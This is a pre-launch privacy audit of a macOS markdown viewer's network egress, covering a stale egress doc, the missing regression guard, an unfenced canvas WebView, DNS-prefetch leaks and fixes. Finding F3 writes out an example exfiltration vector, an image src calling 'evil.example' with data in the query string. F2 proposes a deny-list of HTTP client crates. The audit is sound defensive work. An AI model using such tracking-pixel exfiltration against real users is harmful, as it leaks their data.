# Pre-launch audit — Privacy & network egress

**Dimension:** Enumerate every byte that can leave the machine (Feeds/HTTPClientCore, WebView
subresources, DNS prefetch, subprocess fetches) and confirm the "no telemetry / no phone-home"
claim holds with a regression pin, not just a doc.

**Date:** 2026-07-10 · **Repo state:** `main` @ `92c72206` (+ uncommitted WIP in `main.swift`,
`MCPSocketBridge.swift`)

---

## Executive summary

The **"no telemetry / no phone-home" claim is TRUE today** in the strict sense: there is no
update checker, no crash reporter, no analytics, no background egress that fires without an
explicit user action. Every automatic-egress vector I could find is fenced (markdown/raw-HTML
CSPs with `connect-src 'none'`, DNS prefetch disabled on the markdown surface, MCP over a
`chmod 0600` unix socket, rust daemons on unix sockets / `127.0.0.1`, zero HTTP-client crates
in `Cargo.lock`).

However, the dimension's bar — *claim held by a regression pin, not a doc* — **fails on three
counts**:

1. **The claim doc itself (`docs/EGRESS.md`) is stale and its headline sentence is now false.**
   §1 says "There is no `URLSession` … anywhere in `Sources/`" (verified 2026-06-12), but two
   first-party networking features landed since: the HTTP request tool (`HTTPClientCore`,
   TSK-721) and the feed reader fetch layer (`FeedFetcher`, TSK-1148). Both are benign
   (user-initiated / currently unreachable), but the ship-facing privacy inventory no longer
   matches the code — which is exactly how an unnoticed egress surface ships.
2. **There is no repo-wide egress allowlist pin.** No test fails when a new
   `URLSession`/`NWConnection`/socket call is added to `Sources/`, and no test fails when an
   HTTP client crate enters `Cargo.lock`. The CSP strings are pinned per-surface (good), but the
   *inventory* is enforced by nothing. `EGRESS.md` itself flags this residual risk.
3. **The canvas WebView is the one unfenced surface.** `canvas.html` has **no CSP**, its host
   implements **no navigation policy**, and the Rust lowering emits `<img src="…">` straight
   from canvas-document attributes — a canvas doc with `image src="https://…"` will fetch
   remotely on render (tracking-pixel/exfil class), contradicting the canvas design's "No
   network access from canvas documents". Canvas is owner-parked but compiled in and reachable
   via the `mcp__textview__canvas_*` tools.

Fixing all three is small (S/S/S) and safe. Everything else found is defense-in-depth polish.

---

## Methodology

Static analysis only (no UI tests, no window-opening runs, no repo mutation beyond this file).

Examined:

- **Every file that can perform a fetch:** exhaustive `rg` for
  `URLSession|NWConnection|NWListener|CFStream|dataTask|data(from:)|data(for:)|downloadTask`
  across `Sources/` → exactly three real hits (`HTTPClientCore.swift`, `Feeds/FeedFetcher.swift`,
  `Automation/MCPServer.swift` — the last is a comment forbidding it) plus unix-socket code
  (`MCPSocketBridge/Listener`, `RustCore/RemoteTransport`). All read in full or in relevant part.
- **Every WebView host + its load policy:** `HTMLRenderer.swift`, `HTMLDocumentPolicy.swift`
  (read in full), `BrowserNavigationPolicy.swift` (in full), `MarkdownRenderedView.swift`
  (policy kernel + delegate), `CanvasWebViewHost.swift` (in full), `WalkthroughMermaidWebView/
  Page`, `CodeMirrorEditorView` bundle, and the bundled web assets (`codemirror.html`,
  `canvas.html`, `mermaid-shim.js`, `mermaid.min.js` URL census, `markdown.css`).
- **Hardcoded remote URLs:** repo-wide `https?://` census over `Sources/` (122 KB of hits
  triaged; non-comment, non-namespace hits reduced to `DependencySourceResolver.swift`,
  `ForgeRemote.swift`, `GitClonePlan.swift`, `LSPLanguage.swift` — all URL *construction*, no
  fetch).
- **Subprocess egress:** `GitClient.swift` subcommand census (no
  fetch/pull/push/clone/ls-remote), `GitClonePlan` call sites (plan-only, no spawn),
  `LSPClient/LSPDiscovery`, `PluginSubprocessHost`, `JQRunner`, `AudioExporter`, `TerminalModel`,
  `ScriptRunner`.
- **Rust tier:** `rg` for `reqwest|hyper|ureq|curl|rustls|native-tls|TcpStream|TcpListener|bind`
  across `rust-core/` + `Cargo.lock` (zero HTTP client crates; `serve` = launchd/unix socket,
  `web` = `127.0.0.1` bind with anti-DNS-rebinding Host wall, `TcpStream::connect` only in
  `web`'s own tests against `127.0.0.1`).
- **Packaging:** `scripts/entitlements.plist`, `scripts/Info.plist` (no ATS keys), signing
  scripts, `scripts/check-no-secrets.sh`.
- **Claim + pins:** `docs/EGRESS.md` (in full) cross-checked against
  `Tests/ViewerCoreTests/HTMLRendererTests.swift`, `HTMLDocumentPolicyTests.swift`,
  `HTMLTrustModeTests.swift`, `BrowserNavigationPolicyTests.swift`; `rg URLSession Tests/` →
  **zero** hits (no inventory guard).
- **Trigger tracing:** call-site census for `HTTPClientCore.send` (button/`onSubmit` only),
  `FeedReaderViewModel.refresh` (**zero call sites**), `RemoteCoreAttach` (env-var opt-in,
  unix socket).

Not executed: any test run, any network probe, any VM lane.

---

## Findings

### F1 · P1 — `docs/EGRESS.md` §1 is stale; its headline claim is now false

- **File:** `docs/EGRESS.md:14-20` (claim), contradicted by
  `Sources/ViewerCore/HTTPClientCore.swift:281-302` and
  `Sources/ViewerCore/Feeds/FeedFetcher.swift:10-16`
- **Evidence:** EGRESS.md §1: *"There is no `URLSession`, `NWConnection`, or socket code
  anywhere in `Sources/`. … verified against source 2026-06-12."* Since then:
  - `HTTPClientCore.send(_:session:)` (TSK-721) — `try await session.data(for: request)` — a
    real first-party HTTP client, reachable from the "HTTP Request" hosted tab
    (`DocumentModel+ViewHosting.swift:20`, `HTTPClientView.swift:46-48` — user-initiated only).
  - `URLSessionFeedTransport.data(from:)` (TSK-1148) — feed fetch layer (currently dead code,
    see F6, but present in `Sources/`).
  - `MCPSocketListener.swift` / `MCPSocketBridge.swift` — unix-domain *socket code* (local-only,
    not network egress, but the doc's "stdio-only … never opens a socket" wording is also stale).
  - §2's WebView table has no rows for the canvas WebView (F3) or the feed reader.
- **Impact:** The document explicitly written so a firewall alert can be triaged "without a code
  dig" now gives a wrong answer. Pre-launch, this is the artifact a privacy-conscious user (or a
  reviewer) will be pointed at; shipping it stale undermines the whole claim. It also proves the
  process gap: egress-relevant features landed with no forcing function to update the inventory
  (that forcing function is F2).
- **Fix:** Rewrite §1 as "first-party networking: two user-initiated surfaces" with the same
  fence/verdict table treatment as §2; add canvas + feeds rows; correct the MCP wording to
  "stdio + `chmod 0600` unix socket, no TCP". Size **S**, risk **safe**.

### F2 · P1 — No regression pin on the egress inventory (the dimension's explicit bar)

- **Files:** absence — `rg -l URLSession Tests/` → zero matches;
  `docs/EGRESS.md:27` itself records the residual: *"no network-layer TEST pins this — a
  CSP-string regression would re-open egress silently (TSK-635's remaining scope)"*
- **Evidence:** What IS pinned (good, per-surface): the markdown CSP string incl.
  `connect-src 'none'` (`Tests/ViewerCoreTests/HTMLRendererTests.swift:203`), the tracking-pixel
  fence (`:206-219`), DNS-prefetch-off with teeth (`:234-239`), the raw-HTML policy matrix
  (`HTMLDocumentPolicyTests.swift`), untrusted-never-relaxes (`HTMLTrustModeTests.swift`), the
  loopback allowlist kernel (`BrowserNavigationPolicyTests.swift`). What is NOT pinned: the
  *inventory* — nothing fails when a new file in `Sources/` gains `URLSession`/`NWConnection`/
  `socket(`/`connect(` code, and nothing fails when `reqwest`/`hyper`/`ureq` enters
  `rust-core/Cargo.lock`.
- **Impact:** The precise failure mode already happened once at doc level (F1): egress code
  landed and nothing rang. The next landing could be an actual phone-home (a well-meaning
  "check latest version" feature) and would ship silently. The task's bar — "confirm the claim
  holds with a regression pin, not just a doc" — is not met today.
- **Fix:** Add a host-gate source-scan test (same pattern as the repo's existing
  architecture-guard tests, e.g. `CommandVerbCohesionTests`): walk `Sources/**/*.swift`, flag
  `URLSession|NWConnection|NWListener|CFStream` outside an explicit allowlist
  (`HTTPClientCore.swift`, `Feeds/FeedFetcher.swift`) and `socket(`/`AF_INET` outside the
  unix-socket allowlist (`MCPSocketBridge/Listener`, `RemoteTransport` — assert `AF_UNIX`
  usage); a companion rust-gate check greps `Cargo.lock` for a deny-list of HTTP/TLS client
  crates. Failure message points at `docs/EGRESS.md` ("add the row + the fence + this
  allowlist entry in one commit"). Size **S–M**, risk **safe**.

### F3 · P1 — Canvas WebView is unfenced: no CSP, no navigation policy, unrestricted `<img src>`

- **Files:** `Sources/ViewerUI/Resources/canvas/canvas.html:1-17` (head has charset + style
  only — no CSP meta); `Sources/ViewerUI/CanvasWebViewHost.swift:39-47,62-68` (conforms to
  `WKNavigationDelegate` but implements no `decidePolicyFor`; plain `WKWebViewConfiguration`);
  `rust-core/crates/core/src/canvas/lower.rs:316-323` (emits
  `<img … src="<attr>">` with attribute-escaping but **no scheme/origin restriction**);
  `Sources/ViewerUI/Resources/canvas/canvas.js:82,613` (`root.innerHTML = msg.html`).
- **Evidence:** Every other content surface injects a CSP with `img-src file: data:` and
  `connect-src 'none'` (`HTMLRenderer.swift:79`, `HTMLDocumentPolicy.swift:137-141`) — the
  canvas page has none, and `decidePolicyFor` (absent anyway) cannot block subresource loads;
  only a CSP can. So a canvas document containing `image #x src="https://evil.example/p.png?d=…"`
  performs a remote fetch the moment the canvas renders. `docs/CANVAS_DESIGN_CANVAS-0001.md:93`
  states the requirement: *"No network access from canvas documents (same exfil fence as
  trusted HTML)."* — designed, not implemented.
- **Impact:** Canvas docs are agent-authored (the `mcp__textview__canvas_*` tool family) and
  file-loadable — i.e. third-party-content-shaped input. Remote `img` = the tracking-pixel /
  data-exfil class (URL query smuggles data out) that TSK-635 killed on the markdown surface.
  Canvas is owner-parked, but the code ships in the binary and the MCP tools are live.
- **Fix:** Add
  `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'self'; style-src 'unsafe-inline'; img-src file: data:; connect-src 'none'; …">`
  to `canvas.html` (+ `x-dns-prefetch-control: off`), implement `decidePolicyFor` in
  `CanvasWebViewHost` (bootstrap `file:` allow, everything else cancel — copy the
  `HTMLDocumentPolicy.decideSubresource` kernel), and pin the CSP string with a bundle test
  (pattern exists: `CodeMirrorBundleTests`). Optionally reject non-`file:`/relative `src` in
  `lower.rs`. Size **S**, risk **careful** (verify bundled `canvas.js`/inline styles still load
  under the CSP on the VM lane; `script-src 'self'` is required for the external
  `canvas.js` file, and the inline bootstrap in `canvas.html` — if any — may need adjusting).

### F4 · P2 — Raw-HTML render surface lacks the DNS-prefetch kill the markdown surface has

- **Files:** `Sources/ViewerCore/HTMLDocumentPolicy.swift:344-360` (`envelope()` injects
  charset + CSP + viewport — no `x-dns-prefetch-control`); contrast
  `Sources/ViewerCore/HTMLRenderer.swift:97`
  (`<meta http-equiv="x-dns-prefetch-control" content="off">`, added by TSK-812, pinned by
  `HTMLRendererTests.swift:234-239`).
- **Evidence:** TSK-812 established that WebKit resolves the DNS of link `href` hosts without
  any click, and that CSP does **not** cover this DNS-layer leak — that's why the markdown
  template disables it explicitly. The raw-`.html` envelope (same WebKit, same
  `loadHTMLString` mechanics, sanitizer keeps `<a href>` tags) never got the same meta. Same
  gap in the canvas page (folded into F3's fix).
- **Impact:** Opening a hostile `.html` file leaks the set of link hosts it contains to the
  local resolver / upstream DNS (a beacon that works despite `default-src 'none'`). Low
  bandwidth, but it is precisely the class this dimension exists to catch, and the fix is
  already invented in-repo.
- **Fix:** Add the meta to `HTMLDocumentPolicy.envelope()` (both trust levels) + one line in
  `HTMLDocumentPolicyTests` mirroring `test_renderPage_disablesDNSPrefetch_forLinkHosts`.
  Size **S**, risk **safe**.

### F5 · P2 — Markdown preview's navigation kernel allows top-level `.other` navigations to http/https

- **File:** `Sources/ViewerUI/MarkdownRenderedView.swift:1101-1117` — after blocking
  `javascript:`/`vbscript:` (and post-load `file:`/`data:`), the kernel ends with
  `guard navigationType == .linkActivated else { return .allow }` — i.e. a **programmatic
  navigation to a remote `https://` origin is allowed**.
- **Evidence:** Compare `HTMLDocumentPolicy.decideSubresource`
  (`HTMLDocumentPolicy.swift:249-252`), which cancels `http/https/ws/wss/ftp` for `.other`
  navigations on the sibling surface. Today the markdown gap is unreachable in practice: page
  content is sanitizer-stripped of `<script>`/`<meta>` (`HTMLSanitizer.swift:18-19` drops
  `<meta>`, killing `http-equiv=refresh`) and the template CSP blocks page-initiated fetches —
  so nothing inside the page can trigger such a navigation. But the belt has no suspenders: one
  sanitizer regression (or a future template feature that reintroduces `<meta>`/script) turns
  the preview into a navigable remote browser, silently.
- **Impact:** Defense-in-depth hole on the app's highest-traffic surface; a remote top-level
  navigation is full egress (page load + all its subresources + cookies).
- **Fix:** In the `.other` branch, cancel `http/https/ws/wss/ftp(s)` once
  `initialLoadComplete` (mirroring the existing `file:`/`data:` WV-4 guard, which already
  proves the "our own reloads vs page-initiated" discrimination works). Pin with a unit test on
  `Coordinator.decide`. Size **S**, risk **careful** (must not break the mermaid `file:`
  bootstrap or the app's own `loadHTMLString` reloads — reuse the existing
  `expectingProgrammaticLoad` signal).

### F6 · P3 — Feed egress is latent (zero callers), but will flip on silently when wired

- **Files:** `Sources/ViewerUI/FeedReaderViewModel.swift:69` (`func refresh(now:)` — the only
  network path); repo-wide `rg "\.refresh\(" -g '*.swift'` shows **no caller**;
  `Sources/ViewerUI/FeedReaderView.swift:15` (*"mount + the refresh wiring are slice 3"*);
  `DocumentModel+ViewHosting.swift:23-38` wires the view but never calls refresh.
- **Evidence:** `addFeed` only persists; nothing invokes `refresh()`/`FeedFetcher`. So today
  the feed reader generates zero traffic (subscriptions never fetch — a product bug for another
  lens, but a privacy fact for this one).
- **Impact:** The first future commit that wires slice 3 (a timer or on-open refresh,
  `refreshInterval` default 1800s at `FeedReaderViewModel.swift:27`) creates the app's first
  *background, non-user-initiated* egress. Without F1/F2 landed first, it ships against a doc
  that says the app has no networking at all.
- **Fix:** When wiring refresh, update `EGRESS.md` in the same commit (F2's guard message should
  force this) and prefer refresh-on-user-action (open/manual button) over a background timer as
  the default posture. Size **S** (doc/process rider on the future change), risk **safe**.

### F7 · P3 — HTTP tool history/saved requests (may include auth headers) persist as plaintext JSON

- **Files:** `Sources/ViewerCore/HTTPRequestStore.swift:10,108-116` — `http-history.json` /
  `http-saved.json` under `~/Library/Application Support/MarkdownViewer/`;
  `HTTPRequestModel.headers` (`HTTPClientCore.swift:67-88`) round-trips full header values —
  users of an HTTP tool routinely paste `Authorization: Bearer …`.
- **Impact:** Not egress, but privacy-of-data-at-rest on the same feature: bearer tokens
  captured into a world-readable-by-default (0644) support file that outlives the session and
  is included in any naive backup. Peer tools (Postman et al.) treat this as sensitive storage.
- **Fix:** `chmod 0600` on write (pattern exists at `MCPSocketListener.swift:96`), and/or
  redact header *values* for a denylist (`authorization`, `cookie`, `x-api-key`) from history
  entries (keep names). Size **S**, risk **careful** (silent redaction may surprise users who
  expect Load to restore the token — restore-with-placeholder is the usual compromise).

### F8 · P3 — WebKit "fraudulent website warning" (Safe Browsing) never explicitly disabled

- **Files:** no hit for `isFraudulentWebsiteWarningEnabled` anywhere in `Sources/` (checked
  repo-wide).
- **Evidence:** `WKPreferences.isFraudulentWebsiteWarningEnabled` participates in WebKit's safe
  browsing lookups for http(s) loads. All current surfaces load local content
  (`loadHTMLString`/`loadFileURL`), which should not trigger lookups — so this is **latent**,
  becoming live the day the localhost browser tab (TSK-676, `BrowserNavigationPolicy` — kernel
  built, no live WebView wired yet) or any http-loading surface ships. I did not verify
  the OS default for this flag on current macOS; treat "default may be on" as unconfirmed.
- **Impact:** If enabled by default, the first http-loading WebView could contact Apple/Google
  safe-browsing endpoints — third-party egress not in `EGRESS.md`.
- **Fix:** Set it explicitly `false` in a shared `WKWebViewConfiguration` factory (a
  single choke point would also carry the F3 fix) and pin with a config test. Size **S**,
  risk **safe**.

### F9 · P3 — ATS default silently breaks the HTTP tool's advertised `http://` support (privacy-positive, product-negative)

- **Files:** `scripts/Info.plist` — no `NSAppTransportSecurity` key (grep count 0);
  `Sources/ViewerCore/HTTPClientCore.swift:98,215-218` — `http` accepted as a valid scheme and
  advertised in the error copy ("use http or https").
- **Evidence:** With no ATS exception, URLSession denies cleartext `http://` to non-loopback
  hosts (NSURLError -1022) — so the tool's `http` support only actually works for
  localhost-style targets. As shipped, the app cannot send cleartext to the internet even if
  asked: good for the privacy story, but the code and UI promise otherwise.
- **Impact:** For this lens: document that ATS is deliberately left at default (it is part of
  the egress fence — worth a line in EGRESS.md and a pin). For the product lens: either scope
  an `NSAllowsLocalNetworking` exception (keeps the fence) or surface a clear "cleartext blocked
  by App Transport Security" error in the tool.
- **Fix:** Decide + document; S either way. Risk **careful** only if someone reaches for
  `NSAllowsArbitraryLoads` — that would be a **one-way-door** widening of the whole app's
  egress posture and should be refused (per-domain or local-networking exceptions only).

### F10 · P3 — `DependencySourceResolver` pre-builds registry-fetch URLs; the "fetch slice" must route through the egress process when it lands

- **Files:** `Sources/ViewerCore/DependencySourceResolver.swift:37` (*"This is the artifact the
  fetch slice will download"*), `:91-136` (crates.io / static.crates.io / registry.npmjs.org /
  docs.rs URL construction).
- **Evidence:** Today this is pure URL construction — the only consumer path hands URLs to the
  system browser (`DocumentModel+Omni.swift:24-25`), and `gitClonePlan` (`:54-60`) is
  explicitly plan-only ("the `git clone` spawn is the next slice"). No egress yet.
- **Impact:** Two designed-but-unbuilt features (registry artifact download, in-app `git clone`)
  are the next first-party egress surfaces in the pipeline. Same failure mode as F6: they will
  land after the privacy doc was last verified.
- **Fix:** None now; F2's guard is the mechanism that catches both when they land (clone spawns
  `git` — extend the guard's subprocess section or add the EGRESS row in the same commit).
  Size **—**, risk **safe**.

---

## Positive observations

- **No telemetry, no update checker, no crash reporter, no analytics SDK** — confirmed by
  exhaustive grep; the only two first-party network call sites are user-initiated
  (`HTTPClientView` button/submit) or dead (feeds). Zero third-party Swift package or
  HTTP-capable Rust crate (`Cargo.lock` clean of `reqwest`/`hyper`/`ureq`/`curl`/TLS stacks).
- **Markdown surface is genuinely well fenced, with teeth:** CSP
  `default-src 'none'; img-src file: data:; connect-src 'none'; …` (`HTMLRenderer.swift:79`)
  pinned at `HTMLRendererTests.swift:203`; remote-image tracking-pixel fence pinned with an
  explanatory message referencing EGRESS.md (`:206-219`); DNS prefetch disabled
  (`HTMLRenderer.swift:97`) and pinned with a teeth-proven test (`:234-239`).
- **Raw-HTML viewer is a textbook layered design** (`HTMLDocumentPolicy.swift` L0–L4): size cap,
  allowlist sanitizer, JS default-deny, `default-src 'none'` CSP **plus** delegate-level
  subresource cancel, document-tree `file:` fence with symlink/prefix-boundary hardening
  (`:307-324`), and — for trusted pages — consent-gated `connect-src` limited to validated
  bare https origins with an "untrusted NEVER relaxes" invariant (`:154-192`), all host-tested
  (`HTMLDocumentPolicyTests`, `HTMLTrustModeTests`).
- **The localhost browser policy kernel** (`BrowserNavigationPolicy.swift`) is loopback-strict
  with a segment-aware 127/8 matcher that rejects `127.0.0.1.evil.com` (`:141-179`) — and no
  live browser WebView is wired yet, so no exposure today.
- **Local IPC is local by construction:** MCP server is stdio + a `chmod 0600` unix socket
  (`MCPSocketListener.swift:96`), explicitly no URLSession (`MCPServer.swift:15`);
  `RemoteCoreAttach`/`RemoteTransport` is unix-socket-only, env-var opt-in, with the ssh tunnel
  as the trust boundary (`RemoteCoreAttach.swift:4-17`); `mdv-serve` uses launchd socket
  activation/unix sockets (`serve/src/lifecycle.rs:99-125`); the rust `web` frontend binds
  `127.0.0.1` with an anti-DNS-rebinding Host wall (`web/src/main.rs:283,427-430`).
- **Subprocess posture is clean:** `GitClient` invokes only local subcommands (no
  fetch/pull/push/clone/ls-remote anywhere in call sites); in-app clone is plan-only; feed
  items render as SwiftUI `Text` (no HTML/WebView → no remote images from feed content);
  mermaid is vendored with `securityLevel: 'strict'` (`mermaid-shim.js:38`); `codemirror.html`
  carries its own strict CSP; fonts are system-only.
- **Packaging:** hardened runtime with all dangerous entitlements explicitly `false`
  (`scripts/entitlements.plist`); ATS left at its cleartext-blocking default;
  `scripts/check-no-secrets.sh` in the build lane.
- `docs/EGRESS.md` existing at all — an owner-facing egress inventory with a firewall triage
  recipe — is well ahead of industry norm; it just needs to be kept true (F1) and enforced (F2).

## Coverage gaps (not examined)

- **Dynamic verification:** nothing was executed — no live `lsof`/proxy capture of the app, no
  VM run. The 2026-06-11 owner observation (`TextView` → `100.64.100.1`, TSK-643) remains
  unexplained in EGRESS.md §4; static review supports the doc's VPN-first-hop theory but cannot
  close it.
- **WebKit-internal services** (safe-browsing default state — flagged in F8 as unconfirmed,
  spell-check/dictation OS services, `WKWebsiteDataStore` persistence): OS-level behavior not
  statically auditable from this repo.
- **`mermaid.min.js` (vendored, minified, ~36 embedded `http(s)` strings)** — I accepted
  EGRESS.md's prior census (namespaces/links, not fetches) rather than re-auditing 2 MB of
  minified code; the markdown-page CSP would block any fetch it attempted regardless.
- **`codemirror.js` bundle internals** — same treatment (its host page CSP is strict).
- **LSP servers / Tier-B plugin binaries / user shell / ffmpeg**: separate processes with their
  own network identity; inherited risk documented in EGRESS.md §3 but their binaries are out of
  scope.
- **`scripts/` dev-machine egress** (rsync to VM, `swiftpm-advisory-watch.sh`,
  `rust-supply-chain-audit.sh`, notarization): developer-machine traffic, not shipped-app
  egress.
- **The `tui`/`pm`/`highlight` rust crates** were only grep-swept (no network API hits), not
  line-read.
- **Uncommitted WIP** in `Sources/MarkdownViewer/main.swift` / `MCPSocketBridge.swift` was
  reviewed as-is on disk; unstaged changes could move before landing.
